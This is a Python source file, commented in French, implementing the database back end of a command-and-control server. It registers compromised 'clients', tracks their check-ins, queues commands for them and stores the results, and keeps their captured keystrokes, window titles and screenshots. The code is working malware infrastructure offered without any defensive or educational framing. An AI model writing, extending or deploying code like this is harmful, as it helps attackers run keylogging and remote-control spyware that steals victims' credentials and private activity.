"""
Gestionnaire de base de données avec support multi-SGBD (MySQL, PostgreSQL, SQLite)
Utilise SQLAlchemy pour l'abstraction
"""

from sqlalchemy import create_engine, Column, Integer, String, Text, Float, DateTime, ForeignKey
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship
from datetime import datetime
import json
import time
from typing import Optional, Dict, List, Any

Base = declarative_base()

# ==================== MODÈLES ====================

class Client(Base):
    __tablename__ = 'clients'
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    client_id = Column(String(191), unique=True, nullable=False, index=True)
    system_info = Column(Text)
    first_seen = Column(Float)
    last_seen = Column(Float, index=True)
    ip_address = Column(String(45))
    checkin_count = Column(Integer, default=0)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relations
    commands = relationship("Command", back_populates="client", cascade="all, delete-orphan")
    keylogs = relationship("Keylog", back_populates="client", cascade="all, delete-orphan")
    screenshots = relationship("Screenshot", back_populates="client", cascade="all, delete-orphan")
    activities = relationship("ActivityLog", back_populates="client", cascade="all, delete-orphan")


class Command(Base):
    __tablename__ = 'commands'
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    command_id = Column(String(191), unique=True, nullable=False, index=True)
    client_id = Column(String(191), ForeignKey('clients.client_id'), nullable=False, index=True)
    action = Column(String(100))
    data = Column(Text)
    result = Column(Text)
    status = Column(String(20), default='pending', index=True)
    created_at = Column(Float)
    sent_at = Column(Float)
    completed_at = Column(Float)
    
    # Relation
    client = relationship("Client", back_populates="commands")


class Keylog(Base):
    __tablename__ = 'keylogs'
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    client_id = Column(String(191), ForeignKey('clients.client_id'), nullable=False, index=True)
    timestamp = Column(String(50))
    window_title = Column(Text)
    key_data = Column(Text)
    event_type = Column(String(50))
    created_at = Column(DateTime, default=datetime.utcnow, index=True)
    
    # Relation
    client = relationship("Client", back_populates="keylogs")


class Screenshot(Base):
    __tablename__ = 'screenshots'
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    client_id = Column(String(191), ForeignKey('clients.client_id'), nullable=False)
    screenshot_data = Column(Text)
    screenshot_metadata = Column(Text)
    timestamp = Column(Float)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    # Relation
    client = relationship("Client", back_populates="screenshots")


class ActivityLog(Base):
    __tablename__ = 'activity_log'
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    client_id = Column(String(191), ForeignKey('clients.client_id'), nullable=False, index=True)
    activity_type = Column(String(100))
    description = Column(Text)
    timestamp = Column(Float, index=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    # Relation
    client = relationship("Client", back_populates="activities")


# ==================== GESTIONNAIRE DE BASE DE DONNÉES ====================

class DatabaseSQL:
    """Gestionnaire de base de données multi-SGBD"""
    
    def __init__(self, db_url: str = None, echo: bool = False):
        """
        Initialiser la connexion au SGBD
        
        Args:
            db_url: URL de connexion au format SQLAlchemy
                    - SQLite: 'sqlite:///c2_server.db'
                    - MySQL: 'mysql+pymysql://user:pass@localhost/c2_db'
                    - PostgreSQL: 'postgresql://user:pass@localhost/c2_db'
            echo: Afficher les requêtes SQL (debug)
        """
        if db_url is None:
            db_url = 'sqlite:///c2_server.db'
        
        self.engine = create_engine(db_url, echo=echo, pool_pre_ping=True)
        self.Session = sessionmaker(bind=self.engine)
        
        # Créer les tables
        Base.metadata.create_all(self.engine)
        print(f"[DB] Base de données initialisée: {db_url}")
    
    def get_session(self):
        """Obtenir une session de BD"""
        return self.Session()
    
    # ==================== GESTION DES CLIENTS ====================
    
    def register_client(self, client_id: str, system_info: Dict, ip_address: str) -> bool:
        """Enregistrer ou mettre à jour un client"""
        try:
            session = self.get_session()
            current_time = time.time()
            
            client = session.query(Client).filter_by(client_id=client_id).first()
            
            if client:
                # Mise à jour
                client.system_info = json.dumps(system_info)
                client.last_seen = current_time
                client.ip_address = ip_address
                client.checkin_count += 1
                client.updated_at = datetime.utcnow()
            else:
                # Nouveau client
                client = Client(
                    client_id=client_id,
                    system_info=json.dumps(system_info),
                    first_seen=current_time,
                    last_seen=current_time,
                    ip_address=ip_address,
                    checkin_count=1
                )
                session.add(client)
                
                # Log activité
                self._log_activity_session(session, client_id, 'registration', 'New client registered')
            
            session.commit()
            session.close()
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'enregistrement du client: {e}")
            session.rollback()
            session.close()
            return False
    
    def update_client_heartbeat(self, client_id: str) -> bool:
        """Mettre à jour le heartbeat d'un client"""
        try:
            session = self.get_session()
            current_time = time.time()
            
            client = session.query(Client).filter_by(client_id=client_id).first()
            if client:
                client.last_seen = current_time
                client.checkin_count += 1
                client.updated_at = datetime.utcnow()
                session.commit()
                session.close()
                return True
            
            session.close()
            return False
        except Exception as e:
            print(f"[DB] Erreur lors de la mise à jour du heartbeat: {e}")
            session.rollback()
            session.close()
            return False
    
    def get_client(self, client_id: str) -> Optional[Dict]:
        """Récupérer les informations d'un client"""
        try:
            session = self.get_session()
            client = session.query(Client).filter_by(client_id=client_id).first()
            
            if client:
                result = {
                    'client_id': client.client_id,
                    'system_info': json.loads(client.system_info),
                    'first_seen': client.first_seen,
                    'last_seen': client.last_seen,
                    'ip': client.ip_address,
                    'checkin_count': client.checkin_count
                }
                session.close()
                return result
            
            session.close()
            return None
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération du client: {e}")
            session.close()
            return None
    
    def get_all_clients(self) -> List[Dict]:
        """Récupérer tous les clients"""
        try:
            session = self.get_session()
            clients = session.query(Client).order_by(Client.last_seen.desc()).all()
            
            current_time = time.time()
            result = []
            
            for client in clients:
                result.append({
                    'client_id': client.client_id,
                    'system_info': json.loads(client.system_info),
                    'first_seen': client.first_seen,
                    'last_seen': client.last_seen,
                    'ip': client.ip_address,
                    'checkin_count': client.checkin_count,
                    'online': current_time - client.last_seen < 10,
                    'uptime_seconds': current_time - client.first_seen
                })
            
            session.close()
            return result
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des clients: {e}")
            session.close()
            return []
    
    def cleanup_old_clients(self, max_age_seconds: int = 3600) -> int:
        """Supprimer les clients inactifs"""
        try:
            session = self.get_session()
            cutoff_time = time.time() - max_age_seconds
            
            deleted = session.query(Client).filter(Client.last_seen < cutoff_time).delete()
            session.commit()
            
            if deleted > 0:
                print(f"[DB] Supprimé {deleted} clients inactifs")
            
            session.close()
            return deleted
        except Exception as e:
            print(f"[DB] Erreur lors du nettoyage des clients: {e}")
            session.rollback()
            session.close()
            return 0
    
    # ==================== GESTION DES COMMANDES ====================
    
    def add_command(self, client_id: str, command_id: str, action: str, data: Dict) -> bool:
        """Ajouter une nouvelle commande"""
        try:
            session = self.get_session()
            
            command = Command(
                command_id=command_id,
                client_id=client_id,
                action=action,
                data=json.dumps(data),
                status='pending',
                created_at=time.time()
            )
            
            session.add(command)
            self._log_activity_session(session, client_id, 'command_queued', f'Action: {action}')
            session.commit()
            session.close()
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout de la commande: {e}")
            session.rollback()
            session.close()
            return False
    
    def get_pending_commands(self, client_id: str) -> List[Dict]:
        """Récupérer les commandes en attente pour un client"""
        try:
            session = self.get_session()
            
            commands = session.query(Command).filter_by(
                client_id=client_id,
                status='pending'
            ).order_by(Command.created_at).all()
            
            result = []
            current_time = time.time()
            
            for cmd in commands:
                result.append({
                    'command_id': cmd.command_id,
                    'action': cmd.action,
                    'data': json.loads(cmd.data),
                    'timestamp': cmd.created_at
                })
                
                # Marquer comme envoyée
                cmd.status = 'sent'
                cmd.sent_at = current_time
            
            session.commit()
            session.close()
            return result
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des commandes: {e}")
            session.rollback()
            session.close()
            return []
    
    def add_command_result(self, command_id: str, client_id: str, result: Any) -> bool:
        """Mettre à jour une commande avec son résultat"""
        try:
            session = self.get_session()
            
            command = session.query(Command).filter_by(command_id=command_id).first()
            if command:
                command.result = json.dumps(result)
                command.status = 'completed'
                command.completed_at = time.time()
                
                self._log_activity_session(session, client_id, 'command_completed', f'Command {command_id} completed')
                session.commit()
                session.close()
                return True
            
            session.close()
            return False
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout du résultat: {e}")
            session.rollback()
            session.close()
            return False
    
    def get_command_result(self, command_id: str) -> Optional[Dict]:
        """Récupérer le résultat d'une commande"""
        try:
            session = self.get_session()
            
            command = session.query(Command).filter_by(command_id=command_id).first()
            if command and command.result:
                result = {
                    'result': json.loads(command.result),
                    'client_id': command.client_id,
                    'timestamp': command.completed_at,
                    'status': command.status
                }
                session.close()
                return result
            
            session.close()
            return None
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération du résultat: {e}")
            session.close()
            return None
    
    def cleanup_old_commands(self, max_age_seconds: int = 3600):
        """Nettoyer les anciennes commandes complétées"""
        try:
            session = self.get_session()
            cutoff_time = time.time() - max_age_seconds
            
            deleted = session.query(Command).filter(
                Command.status == 'completed',
                Command.completed_at < cutoff_time
            ).delete()
            
            session.commit()
            
            if deleted > 0:
                print(f"[DB] Supprimé {deleted} anciennes commandes")
            
            session.close()
        except Exception as e:
            print(f"[DB] Erreur lors du nettoyage des commandes: {e}")
            session.rollback()
            session.close()
    
    # ==================== GESTION DES KEYLOGS ====================
    
    def add_keylogs(self, client_id: str, logs: List[Dict]) -> bool:
        """Ajouter des keylogs"""
        try:
            session = self.get_session()
            
            for log in logs:
                keylog = Keylog(
                    client_id=client_id,
                    timestamp=log.get('timestamp'),
                    window_title=log.get('window', ''),
                    key_data=log.get('key', ''),
                    event_type=log.get('event', 'keypress')
                )
                session.add(keylog)
            
            self._log_activity_session(session, client_id, 'keylogs', f'Received {len(logs)} keylogs')
            session.commit()
            session.close()
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout des keylogs: {e}")
            session.rollback()
            session.close()
            return False
    
    def get_keylogs(self, client_id: str, limit: int = 100) -> List[Dict]:
        """Récupérer les keylogs d'un client"""
        try:
            session = self.get_session()
            
            keylogs = session.query(Keylog).filter_by(client_id=client_id).order_by(
                Keylog.id.desc()
            ).limit(limit).all()
            
            result = []
            for log in keylogs:
                result.append({
                    'timestamp': log.timestamp,
                    'window': log.window_title,
                    'key': log.key_data,
                    'event': log.event_type
                })
            
            session.close()
            return result
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des keylogs: {e}")
            session.close()
            return []
    
    def get_keylog_stats(self) -> Dict:
        """Récupérer les statistiques des keylogs"""
        try:
            session = self.get_session()
            
            # Compter les logs par client
            from sqlalchemy import func
            
            stats_query = session.query(
                Keylog.client_id,
                func.count(Keylog.id).label('log_count'),
                func.max(Keylog.timestamp).label('last_log_time')
            ).group_by(Keylog.client_id).all()
            
            stats = {}
            total_logs = 0
            current_time = time.time()
            
            for row in stats_query:
                client = session.query(Client).filter_by(client_id=row.client_id).first()
                
                stats[row.client_id] = {
                    'log_count': row.log_count,
                    'last_log_time': row.last_log_time,
                    'client_online': client and (current_time - client.last_seen < 60) if client else False
                }
                total_logs += row.log_count
            
            session.close()
            
            return {
                'total_clients_with_logs': len(stats),
                'total_logs_stored': total_logs,
                'clients': stats
            }
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des stats: {e}")
            session.close()
            return {'total_clients_with_logs': 0, 'total_logs_stored': 0, 'clients': {}}
    
    def cleanup_old_keylogs(self, max_age_seconds: int = 24 * 3600):
        """Nettoyer les anciens keylogs"""
        try:
            session = self.get_session()
            cutoff_date = datetime.utcnow().timestamp() - max_age_seconds
            
            # SQLAlchemy nécessite une comparaison de datetime
            deleted = session.query(Keylog).filter(
                Keylog.created_at < datetime.fromtimestamp(cutoff_date)
            ).delete()
            
            session.commit()
            
            if deleted > 0:
                print(f"[DB] Supprimé {deleted} anciens keylogs")
            
            session.close()
        except Exception as e:
            print(f"[DB] Erreur lors du nettoyage des keylogs: {e}")
            session.rollback()
            session.close()
    
    # ==================== GESTION DES SCREENSHOTS ====================
    
    def add_screenshot(self, client_id: str, screenshot_data: str, metadata: Dict) -> bool:
        """Ajouter un screenshot"""
        try:
            session = self.get_session()
            
            screenshot = Screenshot(
                client_id=client_id,
                screenshot_data=screenshot_data,
                screenshot_metadata=json.dumps(metadata),
                timestamp=time.time()
            )
            
            session.add(screenshot)
            self._log_activity_session(session, client_id, 'screenshot', 'Screenshot received')
            session.commit()
            session.close()
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout du screenshot: {e}")
            session.rollback()
            session.close()
            return False
    
    def get_screenshots(self, client_id: str, limit: int = 10) -> List[Dict]:
        """Récupérer les screenshots d'un client"""
        try:
            session = self.get_session()
            
            screenshots = session.query(Screenshot).filter_by(client_id=client_id).order_by(
                Screenshot.id.desc()
            ).limit(limit).all()
            
            result = []
            for ss in screenshots:
                result.append({
                    'data': ss.screenshot_data,
                    'metadata': json.loads(ss.screenshot_metadata),
                    'timestamp': ss.timestamp
                })
            
            session.close()
            return result
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des screenshots: {e}")
            session.close()
            return []
    
    # ==================== GESTION DES ACTIVITÉS ====================
    
    def log_activity(self, client_id: str, activity_type: str, description: str):
        """Logger une activité"""
        try:
            session = self.get_session()
            self._log_activity_session(session, client_id, activity_type, description)
            session.commit()
            session.close()
        except Exception as e:
            print(f"[DB] Erreur lors du log d'activité: {e}")
            session.rollback()
            session.close()
    
    def _log_activity_session(self, session, client_id: str, activity_type: str, description: str):
        """Logger une activité avec une session existante"""
        activity = ActivityLog(
            client_id=client_id,
            activity_type=activity_type,
            description=description,
            timestamp=time.time()
        )
        session.add(activity)
    
    def get_activity_log(self, client_id: str = None, limit: int = 100) -> List[Dict]:
        """Récupérer l'historique des activités"""
        try:
            session = self.get_session()
            
            query = session.query(ActivityLog)
            if client_id:
                query = query.filter_by(client_id=client_id)
            
            activities = query.order_by(ActivityLog.timestamp.desc()).limit(limit).all()
            
            result = []
            for activity in activities:
                result.append({
                    'client_id': activity.client_id,
                    'activity_type': activity.activity_type,
                    'description': activity.description,
                    'timestamp': activity.timestamp
                })
            
            session.close()
            return result
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des activités: {e}")
            session.close()
            return []
    
    def close(self):
        """Fermer les connexions"""
        self.engine.dispose()
